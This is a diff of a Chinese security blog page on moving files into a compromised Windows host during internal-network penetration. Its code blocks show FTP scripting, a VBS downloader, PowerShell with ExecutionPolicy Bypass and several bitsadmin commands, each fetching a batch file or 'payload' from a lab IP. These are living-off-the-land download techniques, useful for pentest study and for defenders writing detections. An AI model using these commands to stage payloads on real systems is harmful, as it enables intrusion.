@@ -6,13 +6,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="Windows0x00 FTPecho open 192.168.72.14 21 &amp;gt;&amp;gt; 1.txt         //登陆FTP服务器 echo test&amp;gt;&amp;gt;1.txt                              //用户名 echo 111111&amp;gt;&amp;gt;1.txt                              //密码 echo bi">
+    <meta name="description" content="Windows0x00 FTP12345678echo open 192.168.72.14 21 &amp;gt;&amp;gt; 1.txt         //登陆FTP服务器echo test&amp;gt;&amp;gt;1.txt                              //用户名echo 111111&amp;gt;&amp;gt;1.txt                              //密码ec">
 <meta name="keywords" content="内网渗透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网文件下载传输">
 <meta property="og:url" content="http://imysec.github.io/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/index.html">
 <meta property="og:site_name" content="忆时光">
-<meta property="og:description" content="Windows0x00 FTPecho open 192.168.72.14 21 &amp;gt;&amp;gt; 1.txt         //登陆FTP服务器 echo test&amp;gt;&amp;gt;1.txt                              //用户名 echo 111111&amp;gt;&amp;gt;1.txt                              //密码 echo bi">
+<meta property="og:description" content="Windows0x00 FTP12345678echo open 192.168.72.14 21 &amp;gt;&amp;gt; 1.txt         //登陆FTP服务器echo test&amp;gt;&amp;gt;1.txt                              //用户名echo 111111&amp;gt;&amp;gt;1.txt                              //密码ec">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://imysec.github.io/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/1.png">
 <meta property="og:image" content="http://imysec.github.io/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/2.png">
@@ -20,7 +20,7 @@
 <meta property="og:updated_time" content="2019-11-17T05:22:15.920Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网文件下载传输">
-<meta name="twitter:description" content="Windows0x00 FTPecho open 192.168.72.14 21 &amp;gt;&amp;gt; 1.txt         //登陆FTP服务器 echo test&amp;gt;&amp;gt;1.txt                              //用户名 echo 111111&amp;gt;&amp;gt;1.txt                              //密码 echo bi">
+<meta name="twitter:description" content="Windows0x00 FTP12345678echo open 192.168.72.14 21 &amp;gt;&amp;gt; 1.txt         //登陆FTP服务器echo test&amp;gt;&amp;gt;1.txt                              //用户名echo 111111&amp;gt;&amp;gt;1.txt                              //密码ec">
 <meta name="twitter:image" content="http://imysec.github.io/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/1.png">
     
     
@@ -156,52 +156,20 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><pre><code>echo open 192.168.72.14 21 &gt;&gt; 1.txt         //登陆FTP服务器
-echo test&gt;&gt;1.txt                              //用户名
-echo 111111&gt;&gt;1.txt                              //密码
-echo bin&gt;&gt;1.txt                              //开始
-echo get fw.sh&gt;&gt;1.txt                      //下载程序
-echo bye&gt;&gt;1.txt                              //关闭FTP服务器
-输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：
-ftp -s:1.txt                        //以1.txt中的内容执行ftp命令
-</code></pre><p><img src="/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/1.png" alt=""></p>
-<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p>
-<pre><code>echo Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs
-echo xPost.Open &quot;GET&quot;,&quot;http://192.168.72.14/1.bat&quot;,0  &gt;&gt;test.vbs
-echo xPost.Send() &gt;&gt;test.vbs
-echo set sGet=createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs
-echo sGet.Mode=3 &gt;&gt;test.vbs
-echo sGet.Type=1 &gt;&gt;test.vbs
-echo sGet.Open() &gt;&gt;test.vbs
-echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs
-echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs
-</code></pre><p>这样会在当前目录生成test.vbs<br>然后执行：</p>
-<pre><code>cscript test.vbs
-</code></pre><p><img src="/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/2.png" alt=""></p>
-<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><pre><code>powershell -ExecutionPolicy Bypass -File .\test.ps1
-</code></pre><p>test.ps1内容：</p>
-<pre><code>$d = New-Object System.Net.WebClient
-$d.DownloadFile(&quot;http://192.168.72.14/1.bat&quot;,&quot;1.bat&quot;)
-</code></pre><p><img src="/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/3.png" alt=""></p>
-<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p>
-<pre><code>bitsadmin /transfer n http://192.168.72.13/1.bat c:\new\1.bat
-</code></pre><p>第二种</p>
-<pre><code>bitsadmin /rawreturn /transfer getfile http://192.168.72.13/1.bat c:\new\1.bat
-</code></pre><p>第三种</p>
-<pre><code>bitsadmin /rawreturn /transfer getpayload http://192.168.72.13/1.bat c:\new\1.bat
-</code></pre><p>第四种</p>
-<pre><code>bitsadmin /transfer aa http://192.168.72.13/1.bat c:\new\1.bat
-</code></pre><p>第五种</p>
-<pre><code>bitsadmin /create aa
+    <h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         //登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              //用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              //密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              //开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      //下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              //关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        //以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/1.png" alt=""></p>
+<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http://192.168.72.14/1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet=createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode=3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type=1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure></p>
+<p>这样会在当前目录生成test.vbs<br>然后执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/2.png" alt=""></p>
+<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
+<p>test.ps1内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$d = New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http://192.168.72.14/1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/11/17/nei-wang-wen-jian-xia-zai-chuan-shu/3.png" alt=""></p>
+<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://192.168.72.13/1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure></p>
+<p>第二种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getfile http://192.168.72.13/1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure></p>
+<p>第三种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getpayload http://192.168.72.13/1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure></p>
+<p>第四种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer aa http://192.168.72.13/1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure></p>
+<p>第五种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create aa</span><br><span class="line"></span><br><span class="line">bitsadmin /addfile qianxiao996 http://192.168.72.13/1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin /resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin /info aa /verbose</span><br><span class="line"></span><br><span class="line">bitsadmin /complete aa</span><br></pre></td></tr></table></figure></p>
 
-bitsadmin /addfile qianxiao996 http://192.168.72.13/1.bat c:\new\1.bat
-
-bitsadmin /resume aa
-
-bitsadmin /info aa /verbose
-
-bitsadmin /complete aa
-</code></pre>
   </div>
 </article>
 
